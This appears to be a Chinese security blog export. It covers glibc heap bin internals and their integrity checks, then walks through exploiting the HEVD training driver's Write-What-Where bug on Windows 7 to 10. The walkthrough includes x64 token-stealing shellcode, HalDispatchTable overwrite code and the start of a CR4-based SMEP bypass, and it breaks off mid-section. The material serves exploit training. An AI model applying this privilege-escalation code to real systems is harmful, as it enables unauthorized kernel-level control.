<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">// 遍历 unsorted bin</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-3-Small-bin"><a href="#3-3-Small-bin" class="headerlink" title="3.3 Small bin"></a>3.3 Small bin</h3><p>特点：</p>
<ul>
<li>大小中等</li>
<li>双向链表维护</li>
<li>FIFO</li>
<li>相邻 free chunk 会合并</li>
</ul>
<p>如果程序请求的内存范围不在 fast bin 的范围内，就会考虑small bin。简单点说就是大于 80 Bytes 小于某一个值时，就会选择他。32 位系统下小于512字节的 chunk，64位系统下小于1024字节，small bin 就是用于管理 small chunk 的。就内存分配和释放的速度而言，small bin 比 larger bin 快，但比 fast bin 慢。</p>
<p><strong>malloc(small chunk)</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);<span class="comment">//  找到 smallbin 索引</span></span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin) <span class="comment">// 判断 bin 中是不是有 chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">// 链表检查</span></span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb); <span class="comment">//设置下一个chunk的 in_use 位</span></span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     大内存分配，进入 malloc_consolidate</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>最初所有的 small bin 都是空的，因此在对这些 small bin 完成初始化之前，即使用户请求的内存大小属于 small  chunk 也不会交由 small bin 进行处理，而是交由 unsorted bin 处理，如果 unsorted bin  也不能处理的话，glibc 就以此遍历后续的所有 bins，找出第一个满足要求的 bin，如果所有的 bin 都不满足的话，就转而使用 top  chunk，如果 top chunk大小不够，那么就扩充 top chunk，这样就一定能满足需求了。</p>
<p>在第一次调用 malloc 时，初始 malloc_state 的时候对 small bin 和 large bin 进行初始化，bin 的指针指向自己表明为空。(malloc.c # 1808)</p>
<p>之后，当再次调用 malloc(small chunk) 的时候，如果该 chunk size 对应的 small bin  不为空，就从该 small bin 链表中取得 small chunk，否则就需要交给 unsorted bin 及之后的逻辑来处理了。</p>
<p><strong>free(small chunk)</strong></p>
<p>当释放 small chunk 时，检查它前一个或后一个 chunk 是否空闲，如果是，则合并到一起：将其从 bin 中移除，合并成新的 chunk，最后将新的 chunk 添加到 unsorted bin 中。</p>
<h3 id="3-4-Large-bin"><a href="#3-4-Large-bin" class="headerlink" title="3.4 Large bin"></a>3.<strong>4</strong> Large bin</h3><p>特点：</p>
<ul>
<li>大小较大</li>
<li>双向链表维护</li>
<li>FIFO</li>
<li>相邻 free chunk 会合并</li>
<li>free chunk 多两个位fd_nexitsize，bk_nextsize 指向前一块和后一块 large bin</li>
</ul>
<p>32位系统下大于等于512字节，64位系统下大于等于1024字节的 chunk 称为 large chunk，large bin 就是用于管理这些 large chunk 的。large bin中不再是每个 bin 中的 chunk 大小都固定，每个 bin 中存放着该范围内不同大小的 bin 并在存的过程中进行排序用来加快检索的速度，大的 chunk 放在前面，小的放在后面</p>
<p><strong>malloc(large chunk)</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>初始时全部的 large bins 都为空，即使用户申请了一个 large chunk，不是给 large bin 进行处理，而是交由 next largest bin (<strong>to do</strong>) 进行处理，初始化操作与 small bin 一致。</p>
<p>之后当用户再次请求一个 large bin时，首先确定用户请求的大小属于哪一个 large bin，然后判断该 large bin 中最大的 chunk 的大小是否大于用户请求的大小。</p>
<p>如果大于，就从尾部到头部遍历该 large bin，找到一个大小相等或接近的 chunk 返回给用户。如果该 chunk  大于用户请求的大小的话，就将该 chunk 拆分为两个 chunk：前者返回给用户，且大小等同于用户请求的大小，剩余的部分作为一个新的  chunk 添加到 unsorted bin 中。</p>
<p>如果该 large bin 中最大的 chunk 小于用户请求的大小，那么就依次查看后续不为空的 large bin 中是否有满足需求的 chunk，如果找到合适的，切割之后返回给用户。如果没有找到，尝试交由 top chunk 处理。</p>
<p><strong>free(large chunk)</strong></p>
<p>当释放 large chunk 时，检查它前一个或后一个 chunk 是否空闲，如果是，则合并到一起：将其从 bin 中移除，合并成新的 chunk，最后将新的 chunk 添加到 unsorted bin 中。</p>
<p><img src="/2019/09/08/glibc-heap/4.png" alt="4"></p>
<h2 id="0x04-检查机制"><a href="#0x04-检查机制" class="headerlink" title="0x04 检查机制"></a>0x04 检查机制</h2><h3 id="4-1-free-check"><a href="#4-1-free-check" class="headerlink" title="4.1 free check"></a>4.1 free check</h3><p>free之前的检查</p>
<ul>
<li>指针是否对齐</li>
<li>块的大小是否对齐，且大于最小的大小</li>
<li>块是否在 <code>inuse</code> 状态</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  //检查指针是否正常，对齐</span><br><span class="line">  if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), 0))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = &quot;free(): invalid pointer&quot;;</span><br><span class="line">    errout:</span><br><span class="line">      if (!have_lock &amp;&amp; locked)</span><br><span class="line">        (void) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">// 检查 size 是否 &gt;= MINSIZE ，且是否对齐</span><br><span class="line">  if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = &quot;free(): invalid size&quot;;</span><br><span class="line">      goto errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">// 检查 chunk 是否处于 inuse 状态</span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure>
<h3 id="4-2-Check-In-Glbc"><a href="#4-2-Check-In-Glbc" class="headerlink" title="4.2 Check In Glbc"></a>4.2 Check In Glbc</h3><table>
<thead>
<tr>
<th>函数名</th>
<th>检查</th>
<th>报错信息</th>
</tr>
</thead>
<tbody>
<tr>
<td>unlink</td>
<td>p-&gt;size == nextchunk-&gt;pre_size</td>
<td>corrupted size vs prev_size</td>
</tr>
<tr>
<td>unlink</td>
<td>p-&gt;fd-&gt;bk == p 且 p-&gt;bk-&gt;fd == p</td>
<td>corrupted double-linked list</td>
</tr>
<tr>
<td>_int_malloc</td>
<td>当从fastbin分配内存时 ,找到的那个fastbin chunk的size要等于其位于的fastbin 的大小，比如在0x20的 fastbin中其大小就要为0x20</td>
<td>malloc():memory corruption (fast)</td>
</tr>
<tr>
<td>_int_malloc</td>
<td>当从 smallbin 分配 chunk( victim) 时， 要求 victim-&gt;bk-&gt;fd == victim</td>
<td>malloc(): smallbin double linked list corrupted</td>
</tr>
<tr>
<td>_int_malloc</td>
<td>当迭代 unsorted bin 时 ，迭代中的 chunk (cur)要满足，cur-&gt;size 在 [2*SIZE_SZ,  av-&gt;system_mem] 中</td>
<td>malloc(): memory corruption</td>
</tr>
<tr>
<td>_int_free</td>
<td>当插入一个 chunk 到 fastbin时，判断fastbin的 head 是不是和 释放的 chunk 相等</td>
<td>double free or corruption (fasttop)</td>
</tr>
<tr>
<td>_int_free</td>
<td>判断 next_chunk-&gt;pre_inuse == 1</td>
<td>double free or corruption (!prev)</td>
</tr>
</tbody>
</table>
<h2 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05 Reference"></a>0x05 Reference</h2><p>[+] <a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="noopener">Browse the source code of glibc/malloc/malloc.c</a></p>
<p>[+] <a href="https://www.anquanke.com/post/id/163971#h2-1" target="_blank" rel="noopener">CTF pwn 中最通俗易懂的堆入坑指南</a></p>
<p>[+] <a href="https://www.freebuf.com/articles/system/91527.html" target="_blank" rel="noopener">Libc堆管理机制及漏洞利用技术 </a></p>
<p>[+] <a href="https://0x3f97.github.io/heap-exploitation/2017/12/06/glibc-heap-analysis/" target="_blank" rel="noopener">glibc heap analysis</a></p>
<p>[+] <a href="https://xz.aliyun.com/t/2307" target="_blank" rel="noopener">glibc heap pwn notes</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>题目篇</category>
        <category>PWN</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>Linux Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>www漏洞从win7-win10</title>
    <url>/2019/08/19/www%E6%BC%8F%E6%B4%9E%E4%BB%8Ewin7-win10/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>本篇文章主要分享HEVD这个Windows内核漏洞训练项目中的Write-What-Where漏洞在win7 x64到win10 x64 1605的一个爬坑过程，Windows内核漏洞的原理比较简单，关键点在于exp的编写，这里我从win7 x64开始说起，看此文章之前你需要有以下准备：</p>
<ul>
<li>Windows相应版本的虚拟机</li>
<li>配置好windbg等调试工具，建议配合VirtualKD使用</li>
<li>HEVD+OSR Loader配合构造漏洞环境</li>
</ul>
<p>如果你不是很清楚这个漏洞的基本原理的话，你可以从我的<a href="https://xz.aliyun.com/t/5615" target="_blank" rel="noopener">另一篇文章</a>了解到这个漏洞的原理以及在win 7 x86下的利用，我这里就不多加赘述了</p>
<h1 id="0x01：Windows-7-x64利用"><a href="#0x01：Windows-7-x64利用" class="headerlink" title="0x01：Windows 7 x64利用"></a>0x01：Windows 7 x64利用</h1><p>让我们简单回顾一下在Windows 7 x86下我们利用的利用思路和关键代码，全部的代码参考 =&gt; <a href="https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/ArbitraryOverwrite/ArbitraryOverwrite/test.c" target="_blank" rel="noopener">这里</a></p>
<p><strong>利用思路</strong></p>
<ul>
<li>初始化句柄等结构</li>
<li>计算我们需要Hook的地址<code>HalDispatchTable+0x4</code></li>
<li>调用<code>TriggerArbitraryOverwrite</code>函数将<code>shellcode</code>地址放入Hook地址</li>
<li>调用<code>NtQueryIntervalProfile</code>函数触发漏洞</li>
<li>调用cmd验证提权结果</li>
</ul>
<p><strong>关键代码</strong></p>
<p>计算Hook地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD32 <span class="title">GetHalOffset_4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// ntkrnlpa.exe in kernel space base address</span></span><br><span class="line">	PVOID pNtkrnlpaBase = NtkrnlpaBase();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]ntkrnlpa base address is 0x%p\n"</span>, pNtkrnlpaBase);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ntkrnlpa.exe in user space base address</span></span><br><span class="line">	HMODULE hUserSpaceBase = LoadLibrary(<span class="string">"ntkrnlpa.exe"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// HalDispatchTable in user space address</span></span><br><span class="line">	PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, <span class="string">"HalDispatchTable"</span>);</span><br><span class="line"></span><br><span class="line">	DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + <span class="number">0x4</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]HalDispatchTable+0x4 is 0x%p\n"</span>, hal_4);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (DWORD32)hal_4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用问题函数执行shellcode</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA(<span class="string">"ntdll.dll"</span>), <span class="string">"NtQueryIntervalProfile"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]NtQueryIntervalProfile address is 0x%x\n"</span>, NtQueryIntervalProfile);</span><br><span class="line">NtQueryIntervalProfile(<span class="number">0x1337</span>, &amp;interVal);</span><br></pre></td></tr></table></figure>
<p>总所周知Windows 7 x64是64位的，所以我们很快的就可以想到和32位的不同，所以我们在32位的基础上只需要改一下长度应该就可以拿到system权限了，实际上还是有很多坑的，这里我分享几个我遇到的坑，第一个就是我们的shellcode需要修改，因为是64位，所以偏移都会有改变，但是原理是不会变的</p>
<ul>
<li>当前线程中找到<code>_KTHREAD</code>结构体</li>
<li>找到<code>_EPROCESS</code>结构体</li>
<li>找到当前线程的token</li>
<li>循环便利链表找到system系统的token</li>
<li>替换token</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	mov		rax, gs:[188h]</span><br><span class="line">	mov		rax, [rax+210h]</span><br><span class="line">	mov     rcx, rax</span><br><span class="line">	mov     rdx, 4</span><br><span class="line"></span><br><span class="line">findSystemPid:</span><br><span class="line">    mov    rax, [rax+188h]</span><br><span class="line">    sub    rax, 188h</span><br><span class="line">    cmp    [rax+180h], rdx</span><br><span class="line">    jnz findSystemPid</span><br><span class="line"></span><br><span class="line">    mov rdx, [rax+0208h]</span><br><span class="line">    mov [rcx+0208h], rdx</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
<p><strong>Shellcode在64位下的编译</strong></p>
<p>首先第一个就是shellcode如何放置在64位的编译环境下，如果是像32位那样直接在代码中嵌入汇编是行不通的，这里我们需要以下几步来嵌入汇编代码(我使用的环境是VS2019，当然以前的版本也可以)</p>
<ol>
<li>项目源文件中多创建一个ShellCode.asm文件，放入我们的shellcode</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.code</span><br><span class="line">ShellCode proc</span><br><span class="line">	mov		rax, gs:[188h]</span><br><span class="line">	mov		rax, [rax+210h]</span><br><span class="line">	mov     rcx, rax</span><br><span class="line">	mov     rdx, 4</span><br><span class="line"></span><br><span class="line">findSystemPid:</span><br><span class="line">    mov    rax, [rax+188h]</span><br><span class="line">    sub    rax, 188h</span><br><span class="line">    cmp    [rax+180h], rdx</span><br><span class="line">    jnz findSystemPid</span><br><span class="line"></span><br><span class="line">    mov rdx, [rax+0208h]</span><br><span class="line">    mov [rcx+0208h], rdx</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">ShellCode endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>右键ShellCode.asm文件，点击属性，生成中排除选择否，项类型选择自定义生成工具</li>
</ol>
<p><img src="/2019/08/19/www漏洞从win7-win10/1.png" alt="1564740624883"></p>
<ol start="3">
<li>在自定义工具里面的命令行和输出填写如下内容</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ml64 /c %(filename).asm</span><br><span class="line">%(filename).obj;%(outputs)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/19/www漏洞从win7-win10/2.png" alt="1564743547152"></p>
<ol start="4">
<li>在ShellCode.h中申明如下内容，然后在主利用函数中引用即可</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellCode</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p><strong>shellcode的放置</strong></p>
<p>第二个坑就是shellcode的放置，在x86中我们是如下方法实现shellcode的放置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">Trigger_shellcode</span><span class="params">(DWORD32 where, DWORD32 what)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WRITE_WHAT_WHERE exploit;</span><br><span class="line">	DWORD lpbReturn = <span class="number">0</span>;</span><br><span class="line">	exploit.Where = (PVOID)where;</span><br><span class="line">	exploit.What = (PVOID)&amp; what;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Write at 0x%p\n"</span>, where);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Write with 0x%p\n"</span>, what);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Start to trigger...\n"</span>);</span><br><span class="line">    </span><br><span class="line">	DeviceIoControl(hDevice,</span><br><span class="line">		<span class="number">0x22200B</span>,</span><br><span class="line">		&amp;exploit,</span><br><span class="line">		<span class="keyword">sizeof</span>(WRITE_WHAT_WHERE),</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;lpbReturn,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Success to trigger...\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为我们现在是<code>qword</code>而不是<code>dword</code>，也就是说我们需要调用两次才能将我们的地址完全写进去，所以构造出如下的片段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">Trigger_shellcode</span><span class="params">(UINT64 where, UINT64 what)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	WRITE_WHAT_WHERE exploitlow;</span><br><span class="line">	WRITE_WHAT_WHERE exploithigh;</span><br><span class="line">	DWORD lpbReturn = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	UINT32 lowValue = what;</span><br><span class="line">	UINT32 highvalue = (what &gt;&gt; <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">	exploitlow.What = (PULONG_PTR)&amp; what;</span><br><span class="line">	exploitlow.Where = (PULONG_PTR)where;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Start to trigger "</span>);</span><br><span class="line"></span><br><span class="line">	DeviceIoControl(hDevice,</span><br><span class="line">		<span class="number">0x22200B</span>,</span><br><span class="line">		&amp;exploitlow,</span><br><span class="line">		<span class="number">0x10</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;lpbReturn,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	exploithigh.What = (PULONG_PTR)&amp; highvalue;</span><br><span class="line">	exploithigh.Where = (PULONG_PTR)(where + <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">	DeviceIoControl(hDevice,</span><br><span class="line">		<span class="number">0x22200B</span>,</span><br><span class="line">		&amp;exploithigh,</span><br><span class="line">		<span class="number">0x10</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;lpbReturn,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"=&gt; done!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后整合一下代码即可实现利用，整体代码和验证结果参考 =&gt; <a href="https://github.com/ThunderJie/Write-What-Where" target="_blank" rel="noopener">这里</a></p>
<h1 id="0x02：Windows-8-1-x64利用"><a href="#0x02：Windows-8-1-x64利用" class="headerlink" title="0x02：Windows 8.1 x64利用"></a>0x02：Windows 8.1 x64利用</h1><p>好了win7我们已经完成了利用，我们开始研究win8下的利用，首先我们需要了解一些win8的安全机制，我们拿在win7 x64下的exp直接拖入win8运行观察会发生什么，果不其然蓝屏了，我们查看一下在windbg中的分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*** Fatal System Error: 0x000000fc</span><br><span class="line">                       (0x00007FF6F3B31400,0x1670000089B30025,0xFFFFD000210577E0,0x0000000080000005)</span><br><span class="line"></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">...</span><br><span class="line">0: kd&gt; !analyze -v</span><br><span class="line">*******************************************************************************</span><br><span class="line">*                                                                             *</span><br><span class="line">*                        Bugcheck Analysis                                    *</span><br><span class="line">*                                                                             *</span><br><span class="line">*******************************************************************************</span><br><span class="line"></span><br><span class="line">ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY (fc) // 关注点</span><br><span class="line">An attempt was made to execute non-executable memory.  The guilty driver</span><br><span class="line">is on the stack trace (and is typically the current instruction pointer).</span><br><span class="line">When possible, the guilty driver&apos;s name (Unicode string) is printed on</span><br><span class="line">the bugcheck screen and saved in KiBugCheckDriver.</span><br><span class="line">Arguments:</span><br><span class="line">Arg1: 00007ff6f3b31400, Virtual address for the attempted execute.</span><br><span class="line">Arg2: 1670000089b30025, PTE contents.</span><br><span class="line">Arg3: ffffd000210577e0, (reserved)</span><br><span class="line">Arg4: 0000000080000005, (reserved)</span><br></pre></td></tr></table></figure>
<p>windbg中提示<code>ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY</code>这个错误，我们解读一下这句话，企图执行不可执行的内存，等等，这不就是我们pwn中的NX保护吗</p>
<h2 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h2><p>我们详细来了解一下这个保护机制，SMEP保护开启的时候我们用户层的代码不能在内核层中执行，也就是说我们的shellcode不能得到执行</p>
<p><img src="/2019/08/19/www漏洞从win7-win10/3.png" alt="1564814968337"></p>
<p>这个时候我们回想一下绕过NX的方法，瞬间就想到了ROP，那么我们现在是要拿ROP帮我们做哪些事情呢？我们看下面这张图，可以看到我们的SMEP标志位在第20位，也就是说我们只需要将cr4寄存器修改为关闭SMEP的状态即可运行我们的shellcode了</p>
<p><img src="/2019/08/19/www漏洞从win7-win10/5.png" alt="1564815377766"></p>
<h2 id="ROPgadgets"><a href="#ROPgadgets" class="headerlink" title="ROPgadgets"></a>ROPgadgets</h2><p>我们来查看一下我们的cr4寄存器的运行在我的环境下触发漏洞前后的对比</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.formats 00000000001506f8 // 开启</span><br><span class="line">    Binary:  00000000 00000000 00000000 00000000 00000000 0001        0101 00000110 11111000</span><br><span class="line">.formats 0x406f8          // 关闭</span><br><span class="line">    Binary:  00000000 00000000 00000000 00000000 00000000 0000        0100 00000110 11111000</span><br></pre></td></tr></table></figure>
